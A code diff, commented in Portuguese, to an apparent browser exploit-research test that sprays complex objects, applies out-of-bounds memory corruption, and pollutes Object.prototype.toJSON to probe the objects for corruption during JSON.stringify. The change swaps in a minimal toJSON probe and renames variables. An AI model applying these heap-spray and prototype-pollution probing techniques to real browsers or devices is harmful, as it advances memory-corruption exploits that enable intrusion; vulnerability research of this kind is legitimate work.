@@ -39,40 +39,30 @@ class MyComplexObject {
     }
 }
 
-// toJSON genérica para sondar o objeto que está sendo stringificado
-export function toJSON_ProbeGenericObject() {
-    let result_payload = {
-        toJSON_executed: "toJSON_ProbeGenericObject",
-        this_type: Object.prototype.toString.call(this),
-        this_constructor_name: this?.constructor?.name || "N/A",
-        error_in_toJSON: null,
-        props: {}
-    };
+// toJSON Ultra-Minimalista para este teste
+export function toJSON_UltraMinimalForComplexObject() {
+    // Tente retornar o mínimo possível para ver se o RangeError persiste.
+    // Não faça loops, não acesse muitas propriedades de 'this' inicialmente.
+    // Document.title ou logS3 aqui podem reintroduzir o TypeError se o estado estiver muito ruim.
     try {
-        if (typeof this === 'object' && this !== null) {
-            for (const prop in this) {
-                if (Object.prototype.hasOwnProperty.call(this, prop)) {
-                    try {
-                        if (['id', 'value1', 'value2', 'marker'].includes(prop) && typeof this[prop] !== 'function') {
-                           result_payload.props[prop] = String(this[prop]).substring(0, 50);
-                        }
-                    } catch (e_prop) {
-                        result_payload.props[prop] = `Error accessing: ${e_prop.name}`;
-                    }
-                }
-            }
+        // Apenas para confirmar que foi chamada e qual o tipo de 'this'
+        // Se mesmo isso causar RangeError, é muito sensível.
+        const basicType = Object.prototype.toString.call(this);
+        if (this && typeof this.id !== 'undefined') {
+             return { minimal_toJSON_called: true, id: this.id, type: basicType };
         }
+        return { minimal_toJSON_called: true, type: basicType, id_missing: true };
     } catch (e) {
-        result_payload.error_in_toJSON = `${e.name}: ${e.message}`;
+        // Se o acesso básico a 'this' já falha
+        return { minimal_toJSON_error: e.name + ": " + e.message };
     }
-    return result_payload;
 }
 
 
 export async function executeSprayAndCorruptComplexObjectsTest() {
     const FNAME_TEST = "executeSprayAndCorruptComplexObjectsTest";
-    logS3(`--- Iniciando Teste: Spray de Objetos Complexos, Corrupção OOB, e Sondagem ---`, "test", FNAME_TEST);
-    document.title = `Spray Complex & Corrupt`;
+    logS3(`--- Iniciando Teste: Spray de Objetos Complexos, Corrupção OOB, e Sondagem (com toJSON Ultra-Minimal) ---`, "test", FNAME_TEST);
+    document.title = `Spray Complex & Corrupt (UltraMinimal toJSON)`;
 
     const spray_count = 200; 
     const sprayed_objects = [];
@@ -114,17 +104,17 @@ export async function executeSprayAndCorruptComplexObjectsTest() {
     
     await PAUSE_S3(MEDIUM_PAUSE_S3);
 
-    logS3(`3. Sondando ${sprayed_objects.length} objetos complexos pulverizados...`, "test", FNAME_TEST);
-    document.title = `Sondando ${sprayed_objects.length} ComplexObjs...`;
+    logS3(`3. Sondando ${sprayed_objects.length} objetos complexos pulverizados com toJSON_UltraMinimalForComplexObject...`, "test", FNAME_TEST);
+    document.title = `Sondando ${sprayed_objects.length} ComplexObjs (UltraMinimal)...`;
 
     const ppKey_val = 'toJSON';
     let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
     let pollutionApplied = false;
-    let corruption_detected_in_sprayed = false;
+    let problem_detected_in_sprayed = false; // Nome mais genérico
 
     try {
         Object.defineProperty(Object.prototype, ppKey_val, {
-            value: toJSON_ProbeGenericObject, // Usa a toJSON genérica deste arquivo
+            value: toJSON_UltraMinimalForComplexObject, // Usando a toJSON ultra-minimal
             writable: true, configurable: true, enumerable: false
         });
         pollutionApplied = true;
@@ -133,35 +123,43 @@ export async function executeSprayAndCorruptComplexObjectsTest() {
             const obj = sprayed_objects[i];
             if (!obj) continue;
 
-            if (i > 0 && i % 20 === 0) {
+            if (i > 0 && i % 50 === 0) { // Log menos frequente
                 logS3(`   Sondando objeto ${i}/${sprayed_objects.length}...`, 'info', FNAME_TEST);
                 await PAUSE_S3(SHORT_PAUSE_S3);
             }
 
             let integrityOK = true;
-            let actionResult = "N/A";
             let stringifyResult = null;
             let errorDuringProbe = null;
 
             try {
-                integrityOK = obj.checkIntegrity(); 
+                // Primeiro, verifica a integridade ANTES do stringify, se possível
+                integrityOK = obj.checkIntegrity();
                 if (!integrityOK) {
                     logS3(`   !!!! CORRUPÇÃO DE PROPRIEDADE DETECTADA em sprayed_objects[${i}] ANTES de stringify !!!!`, "critical", FNAME_TEST);
                 }
-                actionResult = obj.action(); 
+                
+                // Agora tenta o stringify
                 stringifyResult = JSON.stringify(obj);
 
-            } catch (e_probe) {
+                // Se stringifyResult contém erro da toJSON_UltraMinimalForComplexObject
+                if (stringifyResult && stringifyResult.minimal_toJSON_error) {
+                     logS3(`   !!!! ERRO DENTRO DA toJSON_UltraMinimal para sprayed_objects[${i}] !!!!: ${stringifyResult.minimal_toJSON_error}`, "critical", FNAME_TEST);
+                     errorDuringProbe = new Error(stringifyResult.minimal_toJSON_error);
+                }
+
+
+            } catch (e_probe) { // Captura erros do JSON.stringify em si (como RangeError)
                 errorDuringProbe = e_probe;
-                logS3(`   !!!! ERRO AO INTERAGIR/STRINGIFY sprayed_objects[${i}] !!!!: ${e_probe.name} - ${e_probe.message}`, "critical", FNAME_TEST);
+                logS3(`   !!!! ERRO AO STRINGIFY sprayed_objects[${i}] !!!!: ${e_probe.name} - ${e_probe.message}`, "critical", FNAME_TEST);
             }
 
             if (!integrityOK || errorDuringProbe) {
-                corruption_detected_in_sprayed = true;
-                logS3(`   Objeto Corrompido: sprayed_objects[${i}].id = ${obj.id || 'ID inacessível'}`, "critical", FNAME_TEST);
-                logS3(`     Integridade: ${integrityOK}, Resultado Ação: ${actionResult}, Erro Sonda: ${errorDuringProbe ? errorDuringProbe.message : 'Nenhum'}`, "info", FNAME_TEST);
+                problem_detected_in_sprayed = true;
+                logS3(`   Problema com Objeto: sprayed_objects[${i}].id = ${obj.id || 'ID inacessível'}`, "critical", FNAME_TEST);
+                logS3(`     Integridade: ${integrityOK}, Erro Sonda (stringify/toJSON): ${errorDuringProbe ? `${errorDuringProbe.name} - ${errorDuringProbe.message}` : 'Nenhum'}`, "info", FNAME_TEST);
                 logS3(`     Resultado Stringify (se houve): ${stringifyResult ? JSON.stringify(stringifyResult) : 'N/A'}`, "info", FNAME_TEST);
-                document.title = `CORRUPTED ComplexObj @ ${i}!`;
+                document.title = `PROBLEM ComplexObj @ ${i}! (${errorDuringProbe ? errorDuringProbe.name : 'IntegrityFail'})`;
                 break; 
             }
         }
@@ -174,13 +172,13 @@ export async function executeSprayAndCorruptComplexObjectsTest() {
         }
     }
 
-    if (!corruption_detected_in_sprayed) {
-        logS3("Nenhuma corrupção óbvia detectada nos objetos complexos pulverizados.", "good", FNAME_TEST);
+    if (!problem_detected_in_sprayed) {
+        logS3("Nenhum problema óbvio (corrupção de propriedade ou erro de stringify/toJSON) detectado nos objetos complexos pulverizados.", "good", FNAME_TEST);
     }
 
-    logS3(`--- Teste Spray de Objetos Complexos CONCLUÍDO ---`, "test", FNAME_TEST);
+    logS3(`--- Teste Spray de Objetos Complexos (toJSON Ultra-Minimal) CONCLUÍDO ---`, "test", FNAME_TEST);
     clearOOBEnvironment();
     sprayed_objects.length = 0; 
     globalThis.gc?.(); 
-    document.title = corruption_detected_in_sprayed ? document.title : `Spray Complex Done`;
+    document.title = problem_detected_in_sprayed ? document.title : `Spray Complex (UltraMinimal) Done`;
 }
